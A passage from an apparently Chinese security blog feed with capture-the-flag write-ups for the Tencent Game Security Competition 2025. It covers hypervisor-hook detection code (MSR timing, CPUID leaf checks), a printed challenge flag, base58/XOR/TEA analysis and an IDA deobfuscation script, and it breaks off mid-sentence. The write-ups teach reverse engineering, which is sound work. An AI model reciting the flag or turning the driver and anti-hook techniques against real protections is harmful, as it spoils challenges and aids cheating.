&#123;y:02x&#125;&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p> 得到结果 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f6 59 ab d7 ea 18 94 ab d4 57 b1 d4 84 c6 f0 d4 53 4e 32 81 bc 86 c3 32 1b 5b f5 67 84 c3 05 96 c6 01</span><br></pre></td></tr></table></figure><p>为了验证 <code>TEA</code>，选择在做完异或加密之后直接把以上密文贴到 <code>check</code> 的内存中，结果返回正确。</p><img src="/2025/04/14/tencent-race-2025-final/25.png" class=""><p>随后拿 <code>Key</code> 异或还是无法得到正确的结果，经查在 <code>+0x95DF</code> 处的指令，读取 <code>flag</code> 的时候存在 <code>VT hook</code>。</p><img src="/2025/04/14/tencent-race-2025-final/26.png" class=""><p>可以发现内存实际是 <code>A</code> 但是读取结果为 <code>0x24</code>，存在类似的单表替换，而刚刚好，TEA 解密得到的信息异或 <code>key</code> 之后得到的值刚好是 <code>0x24</code></p><img src="/2025/04/14/tencent-race-2025-final/27.png" class=""><p>结合初赛的 <code>flag</code> 格式，<code>A</code> 应该是正确的明文了。</p><p>这里就是动调大法，按了三个小时调试器，在取内存的地方下断点，然后每次给内存自增 1，观察 <code>ax</code> 寄存器是否符合预期，最终得到正确的结果</p><img src="/2025/04/14/tencent-race-2025-final/28.png" class=""><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>题目明显使用 VT 技术实现对内存某些部分的无痕 <code>hook</code>，因此我们的做法就是去检测自身运行是否处于 <code>VT</code> 环境。</p><h3 id="MSR检测"><a href="#MSR检测" class="headerlink" title="MSR检测"></a>MSR检测</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_vt_enabled1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> IA32_FEATURE_CONTROL = <span class="number">0x3A</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> msr_val = __readmsr(IA32_FEATURE_CONTROL);</span><br><span class="line">    <span class="keyword">return</span> (msr_val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">2</span>)) != <span class="number">0</span>; <span class="comment">// VMX outside SMX enabled</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">is_vt_enabled1</span>()) &#123;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;VT1 is enabled\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;VT1 is not enabled\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是题目做了 <code>hook</code>，题目运行的时候，我们读取的 <code>MSR</code> 显示是没开启 VT 的。</p><img src="/2025/04/14/tencent-race-2025-final/29.png" class=""><p>如图所示，前者开启题目驱动，<code>VT1</code> 提示 <code>not enable</code>，卸载题目驱动后又能够检测到 <code>VT</code> 处于开启状态。</p><p>于是这里我想到，如果题目要 hook，那么在读取 MSR 的时候必然要运行很多额外代码，这里选择对比开启题目驱动和关闭题目驱动之间的时间差。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_vt_enabled1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER freq; <span class="comment">// 获取频率</span></span><br><span class="line">    LARGE_INTEGER start = <span class="built_in">KeQueryPerformanceCounter</span>(&amp;freq);</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> IA32_FEATURE_CONTROL = <span class="number">0x3A</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> msr_val;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">        msr_val = __readmsr(IA32_FEATURE_CONTROL);</span><br><span class="line">    &#125;</span><br><span class="line">    LARGE_INTEGER end = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line">    LONGLONG delta = end.QuadPart - start.QuadPart;</span><br><span class="line">    LONGLONG elapsed_us = (delta * <span class="number">1000</span>) / freq.QuadPart;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Elapsed time: %lld ms\n&quot;</span>, elapsed_us); <span class="comment">// 打印经过的时间</span></span><br><span class="line">    <span class="keyword">return</span> (msr_val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">2</span>)) != <span class="number">0</span>; <span class="comment">// VMX outside SMX enabled</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2025/04/14/tencent-race-2025-final/30.png" class=""><p>可以发现，我测试了 100000 条 MSR 指令，正常虚拟机运行 132ms，而开启题目驱动之后来到了 <code>2079ms</code>，接近 20 倍的差距。那么第一种方法可以是找一条跟 MSR 指令差不多周期的指令，但是这个指令不会被 VT 影响，最后计算两者的偏差率，超过很多则时间判定不通过，当然它如果不 hook MSR，就可以选择直接判定对应的 VT 位是否处于开启状态，两者联合检测怎么都是可以检测到的。</p><p>这里我使用 <code>inc</code> 指令去比较。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>* k = &amp;a;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000000</span>; i++) &#123;</span><br><span class="line">    *k *= <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">end = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line">delta = end.QuadPart - start.QuadPart;</span><br><span class="line">LONGLONG elapsed_us2 = (delta * <span class="number">1000</span>) / freq.QuadPart;</span><br><span class="line"><span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Elapsed time: %lld ms\n&quot;</span>, elapsed_us2); <span class="comment">// 打印经过的时间</span></span><br></pre></td></tr></table></figure><p>这里使用指针来保证每次循环的结果均写入内存中。</p><img src="/2025/04/14/tencent-race-2025-final/31.png" class=""><p>结果也很完美，那么最终检测 VT 环境可以判断 <code>elapsed_us2/elapsed_us1&gt;5</code>，如果是则说明处于 VT 环境中被 hook。</p><p>最终代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_vt_enabled1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER freq; <span class="comment">// 获取频率</span></span><br><span class="line">    LARGE_INTEGER start = <span class="built_in">KeQueryPerformanceCounter</span>(&amp;freq);</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> IA32_FEATURE_CONTROL = <span class="number">0x3A</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> msr_val;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">        msr_val = __readmsr(IA32_FEATURE_CONTROL);</span><br><span class="line">    &#125;</span><br><span class="line">    LARGE_INTEGER end = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line">    LONGLONG delta = end.QuadPart - start.QuadPart;</span><br><span class="line">    LONGLONG elapsed_us1 = (delta * <span class="number">1000</span>) / freq.QuadPart;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Elapsed time: %lld ms\n&quot;</span>, elapsed_us1); <span class="comment">// 打印经过的时间</span></span><br><span class="line">    start = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span>* k = &amp;a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000000</span>; i++) &#123;</span><br><span class="line">        *k *= <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    end = <span class="built_in">KeQueryPerformanceCounter</span>(<span class="literal">NULL</span>);</span><br><span class="line">    delta = end.QuadPart - start.QuadPart;</span><br><span class="line">    LONGLONG elapsed_us2 = (delta * <span class="number">1000</span>) / freq.QuadPart;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Elapsed time: %lld ms\n&quot;</span>, elapsed_us2); <span class="comment">// 打印经过的时间</span></span><br><span class="line">    <span class="keyword">return</span> elapsed_us1 / elapsed_us2 &gt; <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><img src="/2025/04/14/tencent-race-2025-final/32.png" class=""><p>能够在开启题目驱动的情况下检测到。</p><h3 id="CPUID检测"><a href="#CPUID检测" class="headerlink" title="CPUID检测"></a>CPUID检测</h3><p>伪造虚假的 cpuid 参数，通常情况下真机会返回 0，而开启了 VT 则会接管返回正常的值。参考文章：<a href="https://secret.club/2020/04/13/how-anti-cheats-detect-system-emulation.html%E3%80%82">https://secret.club/2020/04/13/how-anti-cheats-detect-system-emulation.html。</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_invalid_leaf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="type">unsigned</span> <span class="type">int</span> invalid_leaf = <span class="number">0x04201337</span>;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="type">unsigned</span> <span class="type">int</span> valid_leaf   = <span class="number">0x40000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">_cpuid_buffer_t</span> InvalidLeafResponse = &#123;&#125;;</span><br><span class="line">    <span class="type">_cpuid_buffer_t</span> ValidLeafResponse   = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    __cpuid(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int32_t</span>*&gt;(&amp;InvalidLeafResponse), invalid_leaf);</span><br><span class="line">    __cpuid(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int32_t</span>*&gt;(&amp;ValidLeafResponse), valid_leaf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((InvalidLeafResponse.EAX != ValidLeafResponse.EAX) ||</span><br><span class="line">        (InvalidLeafResponse.EBX != ValidLeafResponse.EBX) ||</span><br><span class="line">        (InvalidLeafResponse.ECX != ValidLeafResponse.ECX) ||</span><br><span class="line">        (InvalidLeafResponse.EDX != ValidLeafResponse.EDX))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码可以运行在用户层，经测试，该代码在开启题目驱动的真机上返回为 <code>true</code>，未运行题目的真机返回为 <code>false</code>，虚拟机中则一律返回 <code>true</code>。</p><h2 id="目录说明"><a href="#目录说明" class="headerlink" title="目录说明"></a>目录说明</h2><ul><li>XSafe：包含驱动的源码，编译之后先加载该驱动，后加载题目给的驱动，配置正确的情况下可以双机调试且成功加载驱动（无法二次加载及卸载）。</li><li>XSafe.sys：XSafe编译的二进制文件。</li><li>XSafe2：包含爆破 TEA 加密爆破的源码，需要借助驱动 1 找到 TEA 函数的具体位置，并且根据输出的内存地址手动 dump 文件，得到 enc.bin。</li><li>XSafe2.sys：XSafe2编译的二进制文件</li><li>VT-Detection1：包含方法1所述的MSR检测源码，加载时可以判断当前是否处于题目的 VT hook 环境中，虚拟机和真机均有效。</li><li>VT-Detection1.sys：VT-Detection1编译的二进制文件</li><li>VT-Detection2：包含方法2所属的检测方法，只在真机有效。</li><li>VT-Detection2.exe：VT-Detection2编译的二进制文件</li><li>enc.bin：由 XSafe2.sys dump 分配的内存文件。</li><li>exp.py：TEA 加密的还原脚本</li></ul>]]></content>
    
    
    <summary type="html">记录一下今年 2025 决赛过程</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="腾讯游戏安全竞赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2025初赛题解</title>
    <link href="https://xia0ji233.github.io/2025/03/31/tencent-race-2025-pre/"/>
    <id>https://xia0ji233.github.io/2025/03/31/tencent-race-2025-pre/</id>
    <published>2025-03-31T02:00:00.000Z</published>
    <updated>2025-03-31T02:20:37.154Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下今年 2025 初赛过程</p><span id="more"></span><h2 id="参赛选手信息"><a href="#参赛选手信息" class="headerlink" title="参赛选手信息"></a>参赛选手信息</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>小Q是一位热衷于PC客户端安全的技术爱好者，为了不断提升自己的技能，他经常参与各类CTF竞赛。某天，他收到了一封来自神秘人的邮件，内容如下：</p><p>“我可以引领你进入游戏安全的殿堂，但在此之前，你需要通过我的考验。打开这扇大门的钥匙就隐藏在附件中，你有能力找到它吗？</p></blockquote><h2 id="找到正确的flag（2分）"><a href="#找到正确的flag（2分）" class="headerlink" title="找到正确的flag（2分）"></a>找到正确的flag（2分）</h2><p>flag：<code>flag&#123;ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf&#125;</code></p><h3 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h3><p>先说结论：</p><ul><li>运行之后先加载驱动程序。</li><li>输入 flag，判断是否以 <code>ACE_</code> 开头。</li><li>base58 编码剩余的部分，进行反转之后在开头添加 <code>@</code> </li><li>以 <code>sxx</code> 密钥对上一个步骤的结果进行异或加密。</li><li>封装数据，发送给驱动程序。</li></ul><p>下面是分析过程：</p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>定义了一个 <code>ACEDriverSDK</code> 类，初始化虚表。</p><img src="/2025/03/31/tencent-race-2025-pre/1.png" class=""><p>类的定义放 IDA 很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">SDK</span></span><br><span class="line">&#123;</span><br><span class="line">    vtable *table;</span><br><span class="line">    HANDLE port;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虚表可以根据需要进行还原，这里给出我还原的虚表定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">vtable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">void</span> (*init)(SDK *);</span><br><span class="line">    PVOID ptr[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">void</span> (*FltCommunite)(__int64 a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">void</span> *a3, <span class="type">unsigned</span> <span class="type">int</span> a4, LPVOID lpOutBuffer, DWORD dwOutBufferSize, DWORD *a7);</span><br><span class="line">    <span class="built_in">int</span> (__fastcall *LoadDriver)(SDK *);</span><br><span class="line">    <span class="built_in">void</span> (*ClosePort)(SDK *);</span><br><span class="line">    <span class="built_in">void</span> (*Test)(SDK *);</span><br><span class="line">    <span class="built_in">bool</span> (*checkflag)(__int64 SDK, __int64 a2, __int64 a3);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随后就是判断开头是否为 <code>ACE_</code></p><img src="/2025/03/31/tencent-race-2025-pre/2.png" class=""><p>然后初始化了异或密钥，取 <code>ACE_</code> 后的字符串进行其余的加密操作，比如 base58 然后逆转。</p><img src="/2025/03/31/tencent-race-2025-pre/3.png" class=""><p>做完这些操作后，再异或加密。</p><img src="/2025/03/31/tencent-race-2025-pre/5.png" class=""><p>最后通过虚表调用 <code>checkflag</code> 函数。</p><img src="/2025/03/31/tencent-race-2025-pre/6.png" class=""><p><code>checkflag</code> 的逻辑也很简单，就是调用 SDK 的通信函数</p><img src="/2025/03/31/tencent-race-2025-pre/7.png" class=""><p>最后就是看构造通信数据了，<code>0x154004</code> 显然是一个 <code>magic</code> 数据，作为调用功能号，其余的加密数据被追加到 <code>magic</code> 之后。</p><img src="/2025/03/31/tencent-race-2025-pre/8.png" class=""><p>其实中间还漏了一个密文长度追加的逻辑，不过因为动调很容易看出来，所以这部分放另一部分说明，通信协议如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(4字节功能号)</span><br><span class="line">(4字节数据长度，设该值为x)</span><br><span class="line">(x字节加密数据)</span><br></pre></td></tr></table></figure><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>以上分析均结合了动态调试的结果，下面说明一些比较长的函数逻辑判断。</p><p>首先注意到关键加密函数的一个关键操作：</p><img src="/2025/03/31/tencent-race-2025-pre/9.png" class=""><p>断在写入指令，可以发现，最后写入的结果都小于 58，最后返回了一个包含大小写字母和数字的字符串，并且，这个临时写入的变量和最终的密文之间存在对应的关系。</p><p>这里以输入 <code>ACE_11111111111111111111</code> 为例。</p><img src="/2025/03/31/tencent-race-2025-pre/10.png" class=""><p>第一次循环将 <code>1</code> 写入了该内存，很好理解，因为 1 的 <code>ASCII</code> 小于 <code>58</code>。</p><p>然后直接跳出循环，看看最终结果。</p><img src="/2025/03/31/tencent-race-2025-pre/11.png" class=""><p>其实这里大致可以想到 <code>base58</code> 编码了，拿标准 <code>base58</code> 试试看，主要试试相同位置的字符是否能对应上，如果能对应上那就是 <code>base58</code> 无疑了，最多换了码表，顺便说一下，这个地方调试可以顺带 dump 码表，我选择直接在该内存上写上 <code>0 1 2 ...</code>，最后观察字符串的输出，得到码表 <code>abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789</code>。</p><img src="/2025/03/31/tencent-race-2025-pre/12.png" class=""><p>可以发现能对应上，只是顺序反了，随后跳出该函数，返回，观察返回的字符串</p><img src="/2025/03/31/tencent-race-2025-pre/13.png" class=""><p>可以发现相同的字符至少也是能对应上的，只是前面多了一个 <code>@</code></p><p>因为异或密钥稍微跟一下就能得到，就不过多赘述，直接看到最后，在 <code>FilterSendMessage</code> 处下断，观察传出的数据。</p><img src="/2025/03/31/tencent-race-2025-pre/15.png" class=""><p>这里也可以看出来了，头四个字节 <code>0x154004</code>，后面四个字节 <code>0x1c</code> 跟后面密文的长度一致。</p><img src="/2025/03/31/tencent-race-2025-pre/16.png" class=""><p>不放心逻辑再去验证一遍，确定是对的，R3 的所有逻辑至此分析完毕。</p><h3 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h3><h4 id="去混淆"><a href="#去混淆" class="headerlink" title="去混淆"></a>去混淆</h4><p>静态分析，直接找通信的回调函数，应该是注册回调的时候没有加混淆，IDA直接能识别出来。但是加了混淆，由于混淆强度不高，直接特征码大法去掉所有混淆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_nop</span>(<span class="params">start, length</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        patch_byte(start+i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pattern</span>(<span class="params">pattern</span>):</span><br><span class="line">    matches = []</span><br><span class="line">    byte_pattern = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> pattern.split():</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="string">&quot;??&quot;</span>:</span><br><span class="line">            byte_pattern.append(<span class="literal">None</span>)  <span class="comment"># 通配符</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            byte_pattern.append(<span class="built_in">int</span>(byte, <span class="number">16</span>))</span><br><span class="line">    pattern_length = <span class="built_in">len</span>(byte_pattern)</span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x140008000</span>,<span class="number">0x140016000</span>):</span><br><span class="line">        <span class="keyword">match</span> = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pattern_length):</span><br><span class="line">            current_byte = get_wide_byte(head + i)</span><br><span class="line">            <span class="keyword">if</span> byte_pattern[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> current_byte != byte_pattern[i]:</span><br><span class="line">                <span class="keyword">match</span> = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            matches.append(head)</span><br><span class="line">    <span class="keyword">return</span> matches</span><br><span class="line"></span><br><span class="line">parttern = <span class="string">&quot;41 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 9C ?? ?? ?? ?? ?? ?? ?? 9D 41 FF ?? ?? 41 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 51 4C 8D 0D ?? ?? ?? ?? 4D 8D 89 ?? ?? ?? ?? 41 FF E1 ?? 41 59&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 ?? 4C 8D ?? ?? ?? ?? ?? 4D 8D ?? ?? ?? ?? ?? 41 FF ?? ?? 41 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;51 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF ?? E8 59&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;52 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF ?? E8 5A&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;?? 48 B8 ?? ?? ?? ?? ?? ?? ?? ?? 9C ?? ?? ?? ?? ?? ?? ?? 9D FF ?? ?? ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 9C ?? ?? ?? ?? ?? ?? ?? 9D 41 FF ?? ?? 41 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;52 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF ?? E8 5A&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 9C ?? ?? ?? ?? ?? ?? ?? 9D 41 FF ?? ?? 41 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 ?? 4C 8D ?? ?? ?? ?? ?? 4D 8D ?? ?? ?? ?? ?? 41 FF ?? ?? 41 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;41 51 4C 8D 0D ?? ?? ?? ?? 4D 8D 89 ?? ?? ?? ?? 41 FF E1 ?? 41 59&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;51 48 B9 ?? ?? ?? ?? ?? ?? ?? ?? 9C 48 81  ?? ?? ?? ?? ?? 9D FF E1 E8 59&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;52 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF E2 E9 5A&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;E9 01 00 00 00 ??&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;50 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF E0 ?? 58&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;51 48 8D ?? ?? ?? ?? ?? 48 8D ?? ?? ?? ?? ?? FF E1 ?? 59&quot;</span></span><br><span class="line"><span class="comment">#parttern=&quot;?? 48 ?? ?? ?? ?? ?? ?? ?? ?? ?? 9C 48 ?? ?? ?? ?? ?? ?? 9D FF ?? ?? ??&quot;</span></span><br><span class="line">patch_addr_list1 = find_pattern(parttern)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_flower</span>(<span class="params">addr</span>):</span><br><span class="line">    fill_nop(addr,(<span class="built_in">len</span>(parttern)+<span class="number">2</span>)//<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> patch_addr_list1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, <span class="built_in">hex</span>(addr))</span><br><span class="line">    patch_flower(addr)</span><br></pre></td></tr></table></figure><p>每个特征码运行一遍大部分的函数都能进行反编译了（特征码是边分析边总结的，所以可能存在重复的）</p><h4 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h4><p>顺着消息回调函数找到关键调用</p><img src="/2025/03/31/tencent-race-2025-pre/17.png" class=""><p>由于通信的时候 <code>magic==0x154004</code> 是确定的，另外一个分支是测试使用的，因此完全可以不用分析，只分析 <code>1AA0</code> 函数即可。</p><p>本场比赛的第一个需要注意的点（不能算坑，只是踩了）：</p><img src="/2025/03/31/tencent-race-2025-pre/18.png" class=""><p>可以发现 <code>R3</code> 传过来的数据是每两个字节为一组，每个字节零扩展成 <code>unsigned int</code> 类型作为 <code>TEA</code> 加密的明文传入。</p><p>TEA 